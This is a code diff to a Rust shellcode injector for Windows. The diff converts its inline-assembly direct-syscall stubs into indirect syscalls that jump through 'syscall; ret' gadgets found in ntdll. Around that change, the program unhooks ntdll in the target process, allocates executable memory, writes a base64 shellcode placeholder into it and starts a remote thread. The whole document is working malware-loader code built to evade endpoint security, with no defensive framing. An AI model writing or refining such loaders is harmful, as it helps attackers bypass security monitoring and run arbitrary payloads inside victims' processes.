@@ -19,75 +19,116 @@ mod syscall;
 global_asm!(r#"
 .global asm_nt_open_process
 asm_nt_open_process:
-    mov r10, rcx
     mov eax, [rsp + 0x28]
-    syscall
-    ret
+    mov r11, [rsp + 0x30]
+    mov r10, [rsp + 0x38]
+    push r10
+    mov r10, rcx
+    jmp r11
 
 .global asm_nt_allocate_virtual_memory
 asm_nt_allocate_virtual_memory:
-    mov r10, rcx
+    mov rax, [rsp + 0x28]
+    mov [rsp + 0x20], rax
+    mov rax, [rsp + 0x30]
+    mov [rsp + 0x28], rax
     mov eax, [rsp + 0x38]
-    syscall
-    ret
+    mov r11, [rsp + 0x40]
+    mov r10, [rsp + 0x48]
+    push r10
+    mov r10, rcx
+    jmp r11
 
 .global asm_nt_write_virtual_memory
 asm_nt_write_virtual_memory:
-    mov r10, rcx
+    mov rax, [rsp + 0x28]
+    mov [rsp + 0x20], rax
     mov eax, [rsp + 0x30]
-    syscall
-    ret
+    mov r11, [rsp + 0x38]
+    mov r10, [rsp + 0x40]
+    push r10
+    mov r10, rcx
+    jmp r11
 
 .global asm_nt_create_thread_ex
 asm_nt_create_thread_ex:
-    mov r10, rcx
+    mov rax, [rsp + 0x28]
+    mov [rsp + 0x20], rax
+    mov rax, [rsp + 0x30]
+    mov [rsp + 0x28], rax
+    mov rax, [rsp + 0x38]
+    mov [rsp + 0x30], rax
+    mov rax, [rsp + 0x40]
+    mov [rsp + 0x38], rax
+    mov rax, [rsp + 0x48]
+    mov [rsp + 0x40], rax
+    mov rax, [rsp + 0x50]
+    mov [rsp + 0x48], rax
+    mov rax, [rsp + 0x58]
+    mov [rsp + 0x50], rax
     mov eax, [rsp + 0x60]
-    syscall
-    ret
+    mov r11, [rsp + 0x68]
+    mov r10, [rsp + 0x70]
+    push r10
+    mov r10, rcx
+    jmp r11
 
 .global asm_nt_close
 asm_nt_close:
-    mov r10, rcx
     mov eax, edx
-    syscall
-    ret
+    mov r11, r8
+    push r9
+    mov r10, rcx
+    jmp r11
 
 .global asm_nt_protect_virtual_memory
 asm_nt_protect_virtual_memory:
-    mov r10, rcx
+    mov rax, [rsp + 0x28]
+    mov [rsp + 0x20], rax
     mov eax, [rsp + 0x30]
-    syscall
-    ret
+    mov r11, [rsp + 0x38]
+    mov r10, [rsp + 0x40]
+    push r10
+    mov r10, rcx
+    jmp r11
 
 .global asm_nt_read_virtual_memory
 asm_nt_read_virtual_memory:
-    mov r10, rcx
+    mov rax, [rsp + 0x28]
+    mov [rsp + 0x20], rax
     mov eax, [rsp + 0x30]
-    syscall
-    ret
+    mov r11, [rsp + 0x38]
+    mov r10, [rsp + 0x40]
+    push r10
+    mov r10, rcx
+    jmp r11
 
 .global asm_nt_query_information_process
 asm_nt_query_information_process:
-    mov r10, rcx
+    mov rax, [rsp + 0x28]
+    mov [rsp + 0x20], rax
     mov eax, [rsp + 0x30]
-    syscall
-    ret
+    mov r11, [rsp + 0x38]
+    mov r10, [rsp + 0x40]
+    push r10
+    mov r10, rcx
+    jmp r11
 "#);
 
 extern "C" {
-    fn asm_nt_open_process(ProcessHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, ClientId: &mut CLIENT_ID, syscall_id: u32) -> NTSTATUS;
-    fn asm_nt_allocate_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, ZeroBits: u32, RegionSize: &mut usize, AllocationType: u32, Protect: u32, syscall_id: u32) -> NTSTATUS;
-    fn asm_nt_write_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *mut std::ffi::c_void, Buffer: *const std::ffi::c_void, NumberOfBytesToWrite: usize, NumberOfBytesWritten: &mut usize, syscall_id: u32) -> NTSTATUS;
-    fn asm_nt_create_thread_ex(ThreadHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: *mut std::ffi::c_void, Argument: *mut std::ffi::c_void, CreateFlags: u32, ZeroBits: usize, StackSize: usize, MaximumStackSize: usize, AttributeList: *mut std::ffi::c_void, syscall_id: u32) -> NTSTATUS;
-    fn asm_nt_close(Handle: HANDLE, syscall_id: u32) -> NTSTATUS;
-    fn asm_nt_protect_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, NumberOfBytesToProtect: &mut usize, NewProperty: u32, OldProperty: &mut u32, syscall_id: u32) -> NTSTATUS;
-    fn asm_nt_read_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *const std::ffi::c_void, Buffer: *mut std::ffi::c_void, NumberOfBytesToRead: usize, NumberOfBytesRead: &mut usize, syscall_id: u32) -> NTSTATUS;
-    fn asm_nt_query_information_process(ProcessHandle: HANDLE, ProcessInformationClass: u32, ProcessInformation: *mut std::ffi::c_void, ProcessInformationLength: u32, ReturnLength: &mut u32, syscall_id: u32) -> NTSTATUS;
+    fn asm_nt_open_process(ProcessHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, ClientId: &mut CLIENT_ID, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
+    fn asm_nt_allocate_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, ZeroBits: u32, RegionSize: &mut usize, AllocationType: u32, Protect: u32, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
+    fn asm_nt_write_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *mut std::ffi::c_void, Buffer: *const std::ffi::c_void, NumberOfBytesToWrite: usize, NumberOfBytesWritten: &mut usize, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
+    fn asm_nt_create_thread_ex(ThreadHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: *mut std::ffi::c_void, Argument: *mut std::ffi::c_void, CreateFlags: u32, ZeroBits: usize, StackSize: usize, MaximumStackSize: usize, AttributeList: *mut std::ffi::c_void, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
+    fn asm_nt_close(Handle: HANDLE, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
+    fn asm_nt_protect_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, NumberOfBytesToProtect: &mut usize, NewProperty: u32, OldProperty: &mut u32, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
+    fn asm_nt_read_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *const std::ffi::c_void, Buffer: *mut std::ffi::c_void, NumberOfBytesToRead: usize, NumberOfBytesRead: &mut usize, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
+    fn asm_nt_query_information_process(ProcessHandle: HANDLE, ProcessInformationClass: u32, ProcessInformation: *mut std::ffi::c_void, ProcessInformationLength: u32, ReturnLength: &mut u32, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
 }
 
 const SHELLCODE: &str = "Sh_replace";
 
-fn get_module_base_address(process_handle: HANDLE, module_name: &str) -> Option<usize> {
+fn get_module_base_address(process_handle: HANDLE, module_name: &str, gadgets: &syscall::Gadgets) -> Option<usize> {
     let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
     let mut return_len = 0;
     let nt_query_info_syscall = syscall::get_syscall_number("NtQueryInformationProcess")?;
@@ -101,6 +142,8 @@ fn get_module_base_address(process_handle: HANDLE, module_name: &str) -> Option<
             mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
             &mut return_len,
             nt_query_info_syscall,
+            gadgets.syscall_ret,
+            gadgets.ret,
         )
     };
 
@@ -118,6 +161,8 @@ fn get_module_base_address(process_handle: HANDLE, module_name: &str) -> Option<
             mem::size_of::<*mut std::ffi::c_void>(),
             &mut bytes_read,
             nt_read_mem_syscall,
+            gadgets.syscall_ret,
+            gadgets.ret,
         );
     }
 
@@ -130,6 +175,8 @@ fn get_module_base_address(process_handle: HANDLE, module_name: &str) -> Option<
             mem::size_of::<[usize; 2]>(),
             &mut bytes_read,
             nt_read_mem_syscall,
+            gadgets.syscall_ret,
+            gadgets.ret,
         );
     }
 
@@ -144,6 +191,8 @@ fn get_module_base_address(process_handle: HANDLE, module_name: &str) -> Option<
                 mem::size_of::<usize>(),
                 &mut bytes_read,
                 nt_read_mem_syscall,
+                gadgets.syscall_ret,
+                gadgets.ret,
             );
         }
 
@@ -157,6 +206,8 @@ fn get_module_base_address(process_handle: HANDLE, module_name: &str) -> Option<
                 2,
                 &mut bytes_read,
                 nt_read_mem_syscall,
+                gadgets.syscall_ret,
+                gadgets.ret,
             );
             asm_nt_read_virtual_memory(
                 process_handle,
@@ -165,6 +216,8 @@ fn get_module_base_address(process_handle: HANDLE, module_name: &str) -> Option<
                 mem::size_of::<usize>(),
                 &mut bytes_read,
                 nt_read_mem_syscall,
+                gadgets.syscall_ret,
+                gadgets.ret,
             );
         }
 
@@ -177,6 +230,8 @@ fn get_module_base_address(process_handle: HANDLE, module_name: &str) -> Option<
                 base_name_len as usize,
                 &mut bytes_read,
                 nt_read_mem_syscall,
+                gadgets.syscall_ret,
+                gadgets.ret,
             );
         }
 
@@ -193,6 +248,8 @@ fn get_module_base_address(process_handle: HANDLE, module_name: &str) -> Option<
                 mem::size_of::<usize>(),
                 &mut bytes_read,
                 nt_read_mem_syscall,
+                gadgets.syscall_ret,
+                gadgets.ret,
             );
         }
     }
@@ -200,7 +257,7 @@ fn get_module_base_address(process_handle: HANDLE, module_name: &str) -> Option<
     None
 }
 
-fn unhook_remote_ntdll(process_handle: HANDLE, remote_base: usize) {
+fn unhook_remote_ntdll(process_handle: HANDLE, remote_base: usize, gadgets: &syscall::Gadgets) {
     let ntdll_bytes = std::fs::read("C:\\Windows\\System32\\ntdll.dll").expect("Failed to read ntdll.dll");
     let dos_header = ntdll_bytes.as_ptr() as *const IMAGE_DOS_HEADER;
     let nt_headers = unsafe { (ntdll_bytes.as_ptr() as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64 };
@@ -235,6 +292,8 @@ fn unhook_remote_ntdll(process_handle: HANDLE, remote_base: usize) {
                     PAGE_EXECUTE_READWRITE,
                     &mut old_protect,
                     nt_protect_syscall,
+                    gadgets.syscall_ret,
+                    gadgets.ret,
                 );
 
                 let mut bytes_written = 0;
@@ -245,6 +304,8 @@ fn unhook_remote_ntdll(process_handle: HANDLE, remote_base: usize) {
                     size_of_raw_data,
                     &mut bytes_written,
                     nt_write_syscall,
+                    gadgets.syscall_ret,
+                    gadgets.ret,
                 );
 
                 asm_nt_protect_virtual_memory(
@@ -254,6 +315,8 @@ fn unhook_remote_ntdll(process_handle: HANDLE, remote_base: usize) {
                     old_protect,
                     &mut old_protect,
                     nt_protect_syscall,
+                    gadgets.syscall_ret,
+                    gadgets.ret,
                 );
             }
             break;
@@ -292,6 +355,7 @@ fn get_process_pid() -> Option<u32> {
 }
 
 fn main() {
+    let gadgets = syscall::get_nt_gadgets().expect("Gadgets not found");
     let target_pid = get_process_pid().expect("Process not found");
     let shellcode = general_purpose::STANDARD.decode(SHELLCODE).expect("Invalid shellcode");
 
@@ -309,13 +373,15 @@ fn main() {
             &mut object_attributes,
             &mut client_id,
             nt_open_process_syscall,
+            gadgets.syscall_ret,
+            gadgets.ret,
         )
     };
 
     if status != 0 { return; }
 
-    if let Some(ntdll_base) = get_module_base_address(process_handle, "ntdll.dll") {
-        unhook_remote_ntdll(process_handle, ntdll_base);
+    if let Some(ntdll_base) = get_module_base_address(process_handle, "ntdll.dll", &gadgets) {
+        unhook_remote_ntdll(process_handle, ntdll_base, &gadgets);
     }
 
     let mut alloc_addr: *mut std::ffi::c_void = std::ptr::null_mut();
@@ -331,6 +397,8 @@ fn main() {
             MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE,
             nt_allocate_virtual_memory_syscall,
+            gadgets.syscall_ret,
+            gadgets.ret,
         )
     };
 
@@ -347,6 +415,8 @@ fn main() {
             shellcode.len(),
             &mut bytes_written,
             nt_write_virtual_memory_syscall,
+            gadgets.syscall_ret,
+            gadgets.ret,
         )
     };
 
@@ -369,6 +439,8 @@ fn main() {
             0,
             std::ptr::null_mut(),
             nt_create_thread_ex_syscall,
+            gadgets.syscall_ret,
+            gadgets.ret,
         )
     };
 
@@ -377,7 +449,7 @@ fn main() {
     let nt_close_syscall = syscall::get_syscall_number("NtClose").expect("Syscall not found");
 
     unsafe {
-        asm_nt_close(thread_handle, nt_close_syscall);
-        asm_nt_close(process_handle, nt_close_syscall);
+        asm_nt_close(thread_handle, nt_close_syscall, gadgets.syscall_ret, gadgets.ret);
+        asm_nt_close(process_handle, nt_close_syscall, gadgets.syscall_ret, gadgets.ret);
     }
 }
